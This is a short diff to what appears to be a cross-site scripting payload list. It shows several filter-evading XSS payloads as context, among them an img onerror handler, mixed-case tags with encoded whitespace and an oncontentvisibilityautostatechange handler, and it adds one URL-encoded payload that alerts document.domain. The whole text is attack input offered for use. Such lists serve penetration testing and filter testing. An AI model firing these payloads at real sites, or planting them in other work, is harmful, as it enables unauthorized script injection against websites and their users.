@@ -187,3 +187,4 @@ javascript​:alert’1’
 "/><hTML%09OnMoUseOVeR%0a=%0a(confirm)()//
 '"><img src=x onerror​=alert()>
 "><input type="text" oncontentvisibilityautostatechange="confirm(/Bypassed/)">
+https:///%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E
